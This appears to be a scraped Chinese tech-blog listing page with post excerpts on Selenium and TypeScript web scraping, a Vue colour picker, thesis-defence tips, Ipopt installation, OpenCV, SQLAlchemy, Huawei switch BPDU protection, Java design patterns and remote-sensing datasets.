		网络爬虫开发(五)01-爬虫高级——Selenium简介 &amp; 根据平台选择安装selenium-webdriver包 &amp; Selenium的基本使用 第3章 爬虫高级 学习目标：
使用Selenium库爬取前端渲染的网页反反爬虫技术 Selenium简介 官方原文介绍：
Selenium automates browsers. That’s it! What you do with that power is entirely up to you. Primarily, it is for automating web applications for testing purposes, but is certainly not limited to just that. Boring web-based administration tasks can (and should!) be automated as well.
Selenium has the support of some of the largest browser vendors who have taken (or are taking) steps to make Selenium a native part of their browser.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2284b685fda767e606e0fa193acdcf4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8831b18a63d1678b482f3641e0ea6932/" rel="bookmark">
			网络爬虫开发(四)-爬虫基础——环境准备、定义options接口、抽取公共部分代码、定义抽象方法、实现TeacherPhotos类、实现NewsList类及总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络爬虫开发(四)-爬虫基础——环境准备、定义options接口、抽取公共部分代码、定义抽象方法、实现TeacherPhotos类、实现NewsList类及总结 封装爬虫基础库 以上代码重复的地方非常多，可以考虑以面向对象的思想进行封装，进一步的提高代码复用率，为了方便开发，保证代码规范，建议使用TypeScript进行封装
以下知识点为扩展内容，需要对面向对象和TypeScript有一定了解！
执行tsc --init初始化项目，生成ts配置文件
TS配置：
{ "compilerOptions": { /* Basic Options */ "target": "es2015", "module": "commonjs", "outDir": "./bin", "rootDir": "./src", "strict": true, "esModuleInterop": true }, "include": [ "src/**/*" ], "exclude": [ "node_modules", "**/*.spec.ts" ] } Spider抽象类：定义options接口、抽取公共部分代码
// 引入http模块 const http = require('http') import SpiderOptions from './interfaces/SpiderOptions' export default abstract class Spider { options: SpiderOptions; constructor(options: SpiderOptions = { url: '', method: 'get' }) { this.options = options this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8831b18a63d1678b482f3641e0ea6932/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9714835e2fb98deb3bdab0e5c04107f/" rel="bookmark">
			vColorPicker与vue3-colorPicker——基于 Vue 的颜色选择器插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言样例特点 一、使用步骤？1. 安装2.引入3.在项目中使用 vcolorpicker 二、选项三、事件四、问题反馈问题所在安装引入例子效果图 前言 vColorPicker——官网
vColorPicker——GitHub
样例 vColorPicker是基于 Vue 的一款颜色选择器插件，仿照Angular的color-picker插件制作
特点 简单易用，UI在原插件基础上优化增加了圆角和过渡动画提供以 npm 的形式安装提供全局组件在支持 html5 input[type=‘color’] 的浏览器实现了「更多颜色」的功能 一、使用步骤？ 1. 安装 npm install vcolorpicker -S 2.引入 在 main.js 文件中引入插件并注册
# main.js import vcolorpicker from 'vcolorpicker' Vue.use(vcolorpicker) 3.在项目中使用 vcolorpicker &lt;template&gt; &lt;colorPicker v-model="color" /&gt; &lt;/template&gt; &lt;script&gt; export default { data () { return { color: '#ff0000' } } } &lt;/script&gt; 二、选项 你可以通过在所在的元素上设置以下属性来配置color-picker
defaultColor：默认颜色，如defaultColor=“#ff0000”disabled：禁用状态，如disabled=true 三、事件 change颜色值改变的时候触发
&lt;colorPicker v-model="color" v-on:change="headleChangeColor"&gt;&lt;/colorPicker&gt; 四、问题反馈 今天下载装了一下，发现布局有问题，倒腾一个多小时，也不知道因为啥，有知道的可以私信我一下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9714835e2fb98deb3bdab0e5c04107f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f122843be8c22510b1b9855c833f8417/" rel="bookmark">
			毕业设计毕业论文答辩技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 、常见问题
1、自己为什么选择这个课题？ 2 、研究这个课题的意义和目的是什么？
3、全文的基本框架、基本结构是如何安排的？
4 、全文的各部分之间逻辑关系如何？
5 、在研究本课题的过程中，发现了那些不同见解？对这些不同的意见，自己是怎样逐步认识 的？又是如何处理的？
6、论文虽未论及，但与其较密切相关的问题还有哪些？
7、还有哪些问题自己还没有搞清楚，在论文中论述得不够透彻？
8、写作论文时立论的主要依据是什么
对以上问题应仔细想一想，必要时要用笔记整理出来，写成发言提纲，在答辩时用。这样才能做到
有备无患，临阵不慌。
二、答辩技巧
1.学生首先要介绍一下论文的概要，这就是所谓“自述报告”，须强调一点的是“自述”而不是“自读”。这里重要的技巧是必须注意不能照本宣读，把报告变成了“读书”。“照本宣读”是第一大忌。这一部分的内容可包括写作动机、缘由、研究方向、选题比较、研究范围、围绕这一论题的最新研究成果、自己在论文中的新见解、新的理解或新的突破。做到概括简要，言简意赅。不能占用过多时间，一般以十分钟为限。所谓“削繁去冗留清被，画到无时是熟时”，就是说，尽量做到词约旨丰，一语中的。要突出重点，把自己的最大收获、最体会、最精华与最富特色的部分表述出来。这里要注意一忌主题不明；二忌内容空泛，东拉西扯；三忌平平淡淡，没有重点。 在答辩时，学生要注意仪态与风度，这是进入人们感受渠道的第一信号。如果答辩者能在最初的两分种内以良好的仪态和风度体现出良好的形象，就有了一个良好的开端。有人将人的体态分解为最小单位来研究（如头、肩、胸、脊、腰等）认为凹胸显现怯懦、自卑，挺显示情绪高昂—但过分则为傲慢自负；肩手颈正显示正直、刚强，脊背挺拔体现严肃而充满自信。但过于如此，就会被人看作拘泥刻板保守，略为弯腰有度，稍稍欠身可表示谦虚礼貌。孙中山先生曾说过“其所具风度姿态，即使全场有肃然起敬之心，举动格式又须使听者有安静和之气”他的这番金玉良言，对我们确实有很大的启发 3.在听取教师提问时所要掌握的技巧要领是：
沉着冷静，边听边记
精神集中，认真思考
既要自信，又要虚心
实事求是，绝不勉强
听准听清，听懂听明
4.在回答问题时所要掌握的技巧是构思时要求每个问题所要答的“中心”“症结”“关健”在哪里？从哪一个角度去回答问题最好？应举什么例子来证明？回答问题的内容实质上是一段有组织的“口头作文”。就要一、文章应有论点、论据。二、有开头主体与结尾。三、有条理、有层次。四、应用词确当，语言流畅。五、应口齿清楚、语速适度。开头要简洁：单刀直入，是最好的开头，开门见山地表述观点，在答辩中是最好的办法。主体部份的表述可条分缕析，即把所要回答的内容逐条归纳分析，实际上是对自己掌握的材料由此及彼，由表及里地做整理。这样的表述就不会流于表面，而能深入本质。条分缕析可以把自己掌握的一些实际例子合并，整理成若干条目，列成几个小标题：分成几点，一点一点，一条一条地说出。满碗的饭必须一口一口吃，满肚子的道理也必须一条一条讲出来，环环相扣，条条相连，令人听完后有清楚的印象。假如在准备的时候已经准备了一个较完整的提纲，那么沿着回答问题的主线，再穿上一些玉珠（举例子）就可以做到中心明确，条理清楚，有理有例了。
作为将要参加论文答辩同学，首先而且必须对自己所著的毕业论文内容有比较深刻理解和比较全面的熟悉。这是为回答毕业论文答辩委员会成员就有关毕业论文的深度及相关知识面而可能提出的论文答辩问题所做的准备。所谓“深刻的理解”是对毕业论文有横向的把握。例如题为《创建名牌产品发展民族产业》的论文，毕业论文答辩委员会可能会问“民族品牌”与“名牌”有何关系。尽管毕业论文中未必涉及“民族品牌”，但 参加论文答辩的学生必须对自己的毕业论文有“比较全面的熟悉”和“比较深刻的理解”，否则，就会出现尴尬局面。
三、论文答辩——图表穿插 任何毕业论文，无论是文科还是理科都或多或少地涉及到用图表表达论文观点的可能，故我认为应该有此准备。图表不仅是一种直观的表达观点的方法，更是一种调节论文答辩会气氛的手段，特别是对私人论文答辩委员会成员来讲，长时间地听述，听觉难免会有排斥性，不再对你论述的内容接纳吸收，这样，必然对你的毕业论文答辩成绩有所影响。所以，应该在论文答辩过程中适当穿插图表或类似图表的其它媒介以提高你的论文答辩成绩。
四、论文答辩——语流适中
进行毕业论文答辩的同学一般都是首次。无数事实证明，他们论文答辩时，说话速度往往越来越快，以致毕业答辩委员会成员听不清楚，影响了毕业答辩成绩。故毕业答辩学生一定要注意在论文答辩过程中的语流速度，要有急有缓，有轻有重，不能像连珠炮似地轰向听众。
五、论文答辩——目光移动毕业生在论文答辩时，一般可脱稿，也可半脱稿，也可完全不脱稿。但不管哪种方式，都应注意自己的目光，使目光时常地瞟向论文答辩委员会成员及会场上的同学们。这是你用目光与听众进行心灵的交流，使听众对你的论题产生兴趣的一种手段。在毕业论文答辩会上，由于听的时间过长，委员们难免会有分神现象，这时，你用目光的投射会很礼貌地将他们的神“拉”回来，使委员们的思路跟着你的思路走。
六、论文答辩——体态语辅助虽然毕业论文答辩同其它论文答辩一样以口语为主，但适当的体态语运用会辅助你的论文答辩，使你的论文答辩效果更好。特别是手势语言的恰当运用会显得自信、有力、不容辩驳。相反，如果你在论文答辩过程中始终直挺挺地站着，或者始终如一地低头俯视，即使你的论文结构再合理、主题再新颖，结论再正确，论文答辩效果也会大受影响。所以在毕业论文答辩时，一定要注意使用体态语。
七、论文答辩——时间控制一般在比较正规的论文答辩会上，都对辩手有答辩时间要求，因此，毕业 论文答辩学生在进行论文答辩时重视论文答辩时间的掌握。对论文答辩时间的控制要有力度，到该截止的时间立即结束，这样，显得有准备，对内容的掌握和控制也轻车熟路，容易给毕业论文答辩委员会成员一个良好的印象。故在毕业论文答辩前应该对将要答辩的内容有时间上的估计。当然在毕业论文答辩过程中灵活地减少或增加也是对论文答辩时间控制的一种表现，应该重视。
八、论文答辩——紧扣主题 在校园中进行毕业论文答辩，往往辩手较多，因此，对于毕业论文答辩委员会成员来说，他们不可能对每一位的毕业论文内容有全面的了解，有的甚至连毕业论文题目也不一定熟悉。因此，在整个论文答辩过程中能否围绕主题进行，能否最后扣题就显得非常重要了。另外，委员们一般也容易就论文题目所涉及的问题进
提问，如界能自始至终地以论文题目为中心展开论述就会使评委思维明朗，对你的毕业论文给予肯定。
九、论文答辩——人称使用 在毕业论文答辩过程中必然涉及到人称使用问题，我建议尽量多地使用第一人称，如“我”“我们”即使论文中的材料是引用他人的，用“我们引用”了哪儿哪儿的数据或材料，特别是毕业论文大多是称自己作的，所以要更多使用而且是果断地、大胆地使用第一人称“我”和“我们”。如果是这样，会使人有这样的印象：东西是你的，工作做了不少！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc8ea1344891f15b8039c3d2572adbd0/" rel="bookmark">
			Linux | Ubuntu 20.04安装ipopt和cppAD | 安装全流程&#43;报错解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 参考资料1. Ipopt安装1. 方式1： 命令行安装2. 方式2：源码安装3. 方式3：源码安装4. Ipopt测试5. 报错修复 2. CppAD安装1. 方式1：命令行安装2. 方式2：源码方式安装3. CppAD测试 3. 测试Ipopt与CppAD是否可用1. 例子2. 编译报错解决1. Undefined reference to `Ipopt::IpoptApplication::IpoptApplication(bool, bool)'2. fatal error: coin/IpIpoptApplication.hpp: No such file or directorycompilation terminated. 参考资料 https://github.com/udacity/CarND-MPC-Quizzes/blob/master/install_Ipopt_CppAD.md
https://blog.csdn.net/qq_34525916/article/details/119186692#:~:text=%E6%A6%82%E8%A7%88
https://coin-or.github.io/CppAD/doc/install.htm
Ubuntu20.04 安装 Ipopt + cppAD流程
coinor库的安装与问题解决
Undefined reference to `Ipopt::IpoptApplication::IpoptApplication(bool, bool)’ 在进行cppad和ipopt的安装时，发现在按照其他博主写的博客进行安装时总是会出现各种各样他们没遇到的问题，所以这里也记录下自己成功安装的步骤。
1. Ipopt安装 这边提供3种方式进行安装，可以先尝试使用方式1，方式1不行的话尝试方式2，方式2不行最后再尝试方式3.
1. 方式1： 命令行安装 sudo apt-get install coinor-libipopt 我这边使用命令行安装时显示无法定位软件包，在更新软件源后依旧无法生效，所以这个方式我放弃了。
2. 方式2：源码安装 安装依赖
sudo apt-get install gcc g++ gfortran git patch wget pkg-config liblapack-dev libmetis-dev libblas-dev 创建一个存放所有跟Ipopt相关的文件夹，便于管理
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc8ea1344891f15b8039c3d2572adbd0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3abe0dfeeca38c09b58cdf7119b03a7/" rel="bookmark">
			OpenCV：图像旋转与缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人工智能的学习之路非常漫长，不少人因为学习路线不对或者学习内容不够专业而举步难行。不过别担心，我为大家整理了一份600多G的学习资源，基本上涵盖了人工智能学习的所有内容。点击下方链接,0元进群领取学习资源,让你的学习之路更加顺畅!记得点赞、关注、收藏、转发哦!点击进群领资料
随着数字图像处理和计算机视觉技术的发展，图像旋转与缩放成为了图像处理中的重要环节。OpenCV作为一个开源的计算机视觉库，提供了丰富的图像处理功能，其中包括图像旋转和缩放等操作。本文将介绍图像旋转与缩放的原理、方法及其在OpenCV中的应用，以及相关技术在计算机视觉和图像处理领域中的重要性。
一、图像旋转
图像旋转是指对图像进行旋转变换，使得图像中的内容相对于图像坐标系进行旋转。图像旋转在计算机视觉和图像处理中具有重要意义，可以用于矫正图片中的旋转物体或者纠正因为拍照角度不正而导致的倾斜图像。在现实生活中，倾斜的图像可能会影响后续的图像分析和识别，通过图像旋转可以使得图像更易于处理和识别。
在OpenCV中，图像旋转可以通过仿射变换和透视变换来实现。其中，仿射变换可以对图像进行平移、旋转、缩放和剪切等操作，而透视变换则能够处理更加复杂的变换，如透视投影和景深变化。
图像旋转的原理通常涉及到数学中的变换矩阵，通过将图像中的每个像素点按照变换矩阵进行变换，便可以实现图像的旋转。在OpenCV中，我们可以通过调用旋转的函数来实现图像的旋转操作，通过设置旋转中心、旋转角度、缩放系数等参数，可以对图像进行任意角度的旋转操作。
二、图像缩放
图像缩放是指对图像进行尺寸的变换，从而使得图像的大小得到压缩或放大。图像缩放在图像处理领域中有着广泛的应用，可以用于图像的尺寸调整、图像融合、特征提取等任务。通过图像缩放，我们可以得到不同分辨率、大小的图像，适应不同的应用场景和需求。
在OpenCV中，图像缩放可以通过resize()函数来实现，通过调整目标图像的大小和插值方法来实现图像的缩放操作。在图像缩放过程中，常见的插值方法包括最近邻插值、双线性插值、双三次插值等，不同的插值方法适用于不同的图像缩放需求。
除了简单的图像缩放，OpenCV还提供了图像金字塔（pyramid）技术来实现图像的尺寸变换。图像金字塔是通过不断降采样或升采样操作来生成图像尺寸层次结构，从而形成多尺度的图像表示。通过图像金字塔技术，我们可以实现图像的多尺度分析、特征提取和目标识别，为图像处理和计算机视觉带来了强大的工具和方法。
三、OpenCV中的应用
在实际的图像处理和计算机视觉应用中，图像旋转与缩放是非常常见且重要的基本操作。在图像处理中，我们常常需要对图像进行矫正和转换，以适应不同的处理需求和应用场景。
图像缩放在图像融合、图像拼接以及图像显示等领域具有非常重要的应用。通过缩放技术，我们可以将不同尺寸的图像进行统一处理，从而适应不同的显示设备或者分辨率要求，使得图像更加易于处理和显示。
图像旋转在文档扫描、目标检测以及医学影像处理等领域也有着广泛的应用。通过旋转技术，我们可以对倾斜的图像进行矫正，使得后续处理更加准确和高效。
四、图像旋转与缩放的重要性
图像旋转与缩放作为图像处理和计算机视觉领域中的基本操作，具有着重要的意义。它们不仅可以帮助我们更好地理解和处理图像信息，同时也为图像识别、分析、检测等任务提供了基础和前提。
在计算机视觉和图像处理领域的实际应用中，我们往往需要对图像进行旋转和缩放操作，以使得图像更适应于特定的处理需求和算法要求。比如，在目标检测和识别中，我们需要对不同尺寸、不同角度的目标进行处理和识别，而图像旋转与缩放便成为了这一过程中不可或缺的一环。
另外，随着深度学习和神经网络技术的不断发展，图像旋转与缩放也成为了图像增强和数据扩充的重要手段。通过对图像进行随机的旋转和缩放变换，可以生成更丰富多样的图像数据，从而提高模型的泛化能力和鲁棒性。因此，对于从事图像处理、计算机视觉和深度学习领域的研究人员和开发者来说，掌握图像旋转与缩放的原理和技术，对于实现各种图像处理任务具有非常重要的意义。
总之，OpenCV提供了丰富的图像旋转与缩放的工具和方法，通过这些技术，我们可以更好地理解和处理图像信息，并使得图像更适应于特定的处理需求和应用场景。在图像处理和计算机视觉领域的实际应用中，图像旋转与缩放技术的重要性不言而喻，它们为实现各种图像处理任务提供了重要保障和支持。随着人工智能和计算机视觉领域的不断发展，图像旋转与缩放技术必将继续发挥着重要作用，并为图像处理和分析的更多领域带来新的突破与发展。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d46e22ae0dc490303bfc70809c2a88b0/" rel="bookmark">
			Python使用SQLAlchemy操作sqlite
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python使用SQLAlchemy操作sqlite sqllite1. SQLite的简介2. 在 Windows 上安装 SQLite3. 使用SQLite创建数据库3.1 命令行创建数据库3.2 navicat连接数据库 4.sqlite的数据类型存储类SQLite Affinity 类型Boolean 数据类型Date 与 Time 数据类型 5. 常用的sql语法**创建表(CREATE TABLE)****插入数据 (INSERT INTO)****查询数据 (SELECT)****更新数据 (UPDATE)****删除数据 (DELETE)****SQLite Glob 子句****SQLite Limit 子句****SQLite Order By 子句****SQLite Group By 子句****SQLite Having 子句****SQLite Distinct 关键字**聚合函数 (SUM, AVG, COUNT, MAX, MIN)**联合查询 (JOIN)****创建视图 (CREATE VIEW)****添加索引 (CREATE INDEX)** 6.Python使用SQLAlchemy操作sqlite6.1 安装SQLAlchemy6.2 创建实现脚本 sqllite 1. SQLite的简介 SQLite（Structured Query Language - Lite）是一种轻量级的嵌入式关系型数据库管理系统（RDBMS）。以下是一些关于SQLite的简介：
轻量级： SQLite 是一个轻量级的数据库引擎，完全配置时小于 400KiB，省略可选功能配置时小于250KiB嵌入式数据库： SQLite 是一个嵌入式数据库，这意味着它可以被嵌入到应用程序中，而不需要一个独立的数据库服务器。这使得它非常适合嵌入到移动应用、桌面应用和其他小型项目中。零配置： SQLite 不需要服务器进程和配置文件。你只需创建一个数据库文件，然后可以在应用程序中直接使用。完全兼容 ACID： SQLite 事务是完全兼容 ACID 的，允许从多个进程或线程安全访问。支持标准的 SQL 语法： SQLite 支持大部分标准的 SQL 语法，因此你可以使用常见的 SQL 查询和操作语句。事务支持： SQLite 提供了对事务的支持，这对于确保数据库的一致性和可靠性非常重要。跨平台： SQLite 可以在多个操作系统上运行，包括Windows、Linux、macOS等。无服务器体系结构： 与传统的客户端-服务器数据库管理系统不同，SQLite 没有独立的服务器进程。数据库引擎直接嵌入到应用程序中。自包含： SQLite 数据库是一个单一的独立文件，包含整个数据库结构和数据。这使得数据库的传输和备份变得相对简单。 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d46e22ae0dc490303bfc70809c2a88b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91f08cc512ec222054482aa47d29127f/" rel="bookmark">
			华为ensp：边缘端口并启动BUDU保护
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如上图前提是三个交换机都做了rstp，则在边缘的地方做 边缘端口并启动BUDU保护，也就是我用绿色圈出来的地方
边缘1 进入交换机的系统视图
interface e0/0/3 进入接口
stp edged-port enable quit 再退回系统视图
stp bpdu-protection 这样就可以了
边缘2 和1的操作是一样的
进入边缘端口
interface e0/0/3 stp edged-port enable quit stp bpdu-protection 这样就开启成功了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2a3cabc0319a76e2402ab81b85d07e8/" rel="bookmark">
			Java常用设计模式(23种）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 介绍 设计模式的六大原则 一、创建型模式 1、单例模式（Singleton Pattern） 1）饿汉式 2）懒汉式，双检锁 3）静态内部类 4）枚举 2、原型模式（Prototype Pattern） 3、工厂模式（Factory Pattern） 4、抽象工厂模式（Abstract Factory Pattern） 5、建造者模式（Builder Pattern） 二、结构型模式 1、适配器模式（Adapter Pattern） 2、组合模式（Composite Pattern） 3、装饰器模式（Decorator Pattern） 4、外观模式（Facade Pattern） 5、享元模式（Flyweight Pattern） 6、代理模式（Proxy Pattern） 1）静态代理 2）jdk动态代理 3）cglib动态代理 7、桥接模式（Bridge Pattern） 三、行为型模式 1、责任链模式（Chain of Responsibility Pattern） 2、命令模式（Command Pattern） 3、解释器模式（Interpreter Pattern） 4、迭代器模式（Iterator Pattern） 5、观察者模式（Observer Pattern） Java自带观察者模式介绍 6、状态模式（State Pattern） 7、模板模式（Template Pattern） 8、中介者模式（Mediator Pattern） 9、备忘录模式（Memento Pattern） 10、访问者模式（Visitor Pattern） 11、策略模式（Strategy Pattern） 其他 1、过滤器模式（Filter Pattern） 2、空对象模式（Null Object Pattern） 介绍 设计模式的起源可以追溯到20世纪80年代，当时面向对象编程开始流行。在这个时期，一些软件开发者开始注意到他们在不同的项目中遇到了相同的问题，并且他们开始寻找可重用的解决方案。这些解决方案被称为设计模式。最早提出设计模式的人是Erich Gamma、Richard Helm、Ralph Johnson和John Vlissides，他们在1994年出版了一本名为《设计模式：可复用面向对象软件的基础》的书，这本书成为了设计模式领域的经典著作。自那时以来，设计模式已经成为软件开发中非常重要的概念，并且在不同的编程语言和开发框架中都得到了广泛的应用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2a3cabc0319a76e2402ab81b85d07e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98d0ef44596d2049a26f790e9986d131/" rel="bookmark">
			公开数据集：灵长类动物多通道感觉运动皮层电生理学的研究
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nonhuman Primate Reaching with Multichannel Sensorimotor Cortex Electrophysiology. 1
公开数据集网址：https://zenodo.org/records/3854034
目录 General DescriptionPossible usesVariable namesDecoder ResultsVideosSupplementsContact InformationCitation General Description 该数据集包括：
细胞外和同时记录的峰值的阈值跨越时间，排序成单位(最多5个，包括一个“散列”单位) ，以及排序的波形片段；触手指尖的 x，y 位置和触及目标的 x，y 位置(两者均以250赫兹采样)。 行为任务是使自我节奏达到目标排列在一个网格(例如8x8)没有间隔或移动前延迟间隔。一只猴子伸出右臂(左半球记录) ，另一只猴子伸出左臂(右半球)。在一些会议记录从 M1和 S1阵列(192个通道) ; 在大多数会议 M1记录是单独的(96个通道)。
来自两个灵长类受试者的数据包括: 猴子1(“ Indy”，跨越约10个月)的37个sessions和猴子2(“ Loco”，跨越约1个月)的10个sessions，分别达到约20,000次和猴子1和6,500次的2。
Possible uses 这些数据对于训练 BCI 解码器是理想的，特别是因为它们没有被分割成试验。我们期望该数据集对于那些希望设计改进的感觉运动皮层电刺激模型或者为比较不同的脑机接口解码器提供同等基础的研究人员将是有价值的。其他用途可能包括手臂运动学统计分析，尖峰噪声相关性或信号相关性，或用于探索会话期间细胞外记录的稳定性或变异性。
Variable names 每个文件包含以下格式的数据。在下面，n 表示记录通道的数量，u 表示排序单元的数量，k 表示样本的数量。
chan_names - n x 1 信道标识符字符串的单元格数组，例如“ M1001”。 cursor_pos - k x 2 光标在笛卡尔坐标系(x，y)中的位置，mm。 finger_pos - k x 3 or k x 6 工作指尖在笛卡尔坐标系(z,-x,-y)中的位置，由手动跟踪器以厘米为单位报告。因此，光标位置是指尖位置的仿射变换，使用以下矩阵:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98d0ef44596d2049a26f790e9986d131/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/448704b0517619131c57047099655fff/" rel="bookmark">
			论文笔记-Deep Learning-Based Change Detection in Remote Sensing Images: A Review（基于深度学习的遥感图像变化检测研究进展）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0 摘要 作者介绍了针对SAR(合成孔径雷达)、多光谱、高光谱、VHR(超高分辨率图像)和异源图像等不同变化检测数据集的有监督、无监督和半监督深度学习技术，并分析其优缺点，讨论了一些重大挑战。
1 背景 变化检测是通过观察不同时期拍摄的图像集来检测同一地理区域的变化。常见的应用有火灾探测、环境检测、灾害监测、城市变化分析、土地管理等，由于其应用较广因此受到了世界各国研究人员的重视。遥感数据时间、空间和光谱分辨率限制了基于遥感数据的变化检测方法，但是随着具有更大技术能力的传感器的发展，很多限制已经被克服。
在过去的几十年里，开发了各种变化检测方法。根据分析单元可分为两类:基于像素的数据分析(PBCD)基于对象的数据分析(OBCD)。PBCD通过比较像素来识别变化，它不能克服辐射变化和不同日期或传感器之间的错配的限制，通常适用于中低分辨率的遥感图像，不能用于VHR图像。而OBCD解决了这些问题，并显著提高了变化检测精度。基于像素和对象的方法见下图。
许多传统的变化检测技术，如代数和变换，受大气条件、季节变化、卫星传感器和太阳高度的影响，降低了变化检测的精度。
基于对象的图像分析，通过提取几何和纹理特征来减少虚假变化，但这是一个复杂且耗时的过程。此外，由于阈值选择，选择合适的标准来捕获所有的变化区域，同时消除不需要的变化区域仍然具有挑战性。
大多数以前的监督或无监督技术依赖于手工制作的特征表示，这些特征表示能力有限，无法描述复杂和高级的变化信息，导致在杂乱的土地覆盖下性能较低。
最近，遥感领域基于深度学习的变化检测已成为一个“热点”，引起了人们的广泛关注并取得了良好的效果。深度学习可以从原始数据中自动提取复杂、分层和非线性的特征，克服了传统变化检测方法的一些局限性。
2 变化检测的遥感数据集 2.1 收集数据集的传感器 卫星图像是变化检测良好的数据来源，来自于包括主动和被动，光学和微波，以及高分辨率和低分辨率的不同传感器。
最近发展的卫星像TerraSAR-X、COSMO-SkyMed能够以亚米级分辨率或着像Sentinel-1以极高的时间分辨率运行。这些系统可以持续几十年进行观测。SAR图像的关键属性是其分辨率和地理覆盖范围，以及所获得信号的频率范围、入射角和发射/接收极化。一般来说，在遥感中使用SAR图像需要几何和辐射校准。
多光谱遥感使用平行框架传感器来检测几个波段的辐射，通常是可见光到中红外的三到六个光谱波段。除了这些波段外，各种卫星传感器还捕获一个或两个热波段的图像。因此，多光谱卫星传感器的光谱带更少但更宽，无法探测到陆地表面的微小细节，也无法分离出光谱反射差异较小的物体。
高光谱遥感传感器可以捕获电磁波谱中从可见光到近红外、中红外、热红外的各种窄光谱波段的图像，而高光谱传感器可以捕获200个或更多波段的能量，这意味着它们可以连续覆盖场景中每个像元的反射光谱。大多数高光谱传感器部署在空中平台上，较少部署在卫星上。
随着地球观测技术的进步，更先进的卫星传感器，如QuickBird、SPOT等，被用于收集VHR图像。
2.2 用于变化检测的数据集 主要介绍变化检测常用的不同类型的遥感数据集，如SAR、多光谱、高光谱、VHR和异源图像。
2.2.1 SAR影像
SAR数据是从一个主动微波传感器获取的，该传感器反映了在任何天气条件下任何时间土地覆盖的后向散射信息。由于其不依赖于日照条件，SAR图像为变化检测任务提供了优势。SAR可以应用于，从基本的雷达功能如目标检测和地理定位，到估计复杂环境的地球物理特性如某些尺寸，粗糙度，含水量，密度等。
SAR最常用的CD数据集，包括渥太华数据集、伯尔尼数据集，旧金山数据集、农田等。数据集的链接如下:
Bern dataset open source: https://github.com/yolalala/RS-source (accessed on 22
December 2021).San Francisco dataset open source: https://github.com/yolalala/RS-source (accessed
on 22 December 2021).Farmland dataset open source: https://share.weiyun.com/5M2gyVd (accessed on 22
December 2021).
随着SAR成像技术的进步，多波段、多极化、多平台SAR图像越来越普遍，为CD任务提供了更多的数据源。另一方面，SAR图像总是存在斑点噪声，使得变化检测比光学遥感图像更加困难。 2.2.2 多光谱图像
多光谱图像通常是通过被动光学传感器获得的。多光谱图像可以提取人眼无法用其视觉感受器捕捉到的红、绿、蓝的附加信息。不同分辨率的多光谱图像的应用场景略有不同。基于深度学习的变化检测算法最常使用的图像来自Landsat和Sentinel系列卫星，因为它们时间分辨率高，成本低。其他卫星，如QuickBird、SPOT、高分和Worldview，具有很高的空间分辨率，能够保留更多的变化细节。因此多光谱数据集分为广域数据集和局部数据集。
广域数据集注重整个大覆盖区域的变化，而忽略了零星目标的细节。其数据集包括美国西南变化检测数据集、MtS-WH、台州数据集、Onera卫星变化检测数据集和NASA地球观测变化数据集。广域数据集链接如下：
Southwest U. S. dataset open source: https://geochange.er.usgs.gov/sw/changes/
anthropogenic/vegas (accessed on 22 December 2021).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/448704b0517619131c57047099655fff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/333eb5839d3554057a98da0491ef0f4b/" rel="bookmark">
			头歌答案--爬虫实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
urllib 爬虫 第1关：urllib基础
任务描述
第2关：urllib进阶 任务描述
requests 爬虫
第1关：requests 基础
任务描述
第2关：requests 进阶
任务描述
网页数据解析
第1关：XPath解析网页 任务描述
第2关：BeautifulSoup解析网页 任务描述
JSON数据解析
第1关：JSON解析 任务描述
爬虫实战——网页抓取及信息提取
第1关：利用URL获取超文本文件并保存至本地 任务描述
第2关：提取子链接 任务描述
第3关：网页数据分析 任务描述
urllib 爬虫 第1关：urllib基础 任务描述 本关任务：掌握 urlopen 函数的使用，完成一个简易的爬取程序。
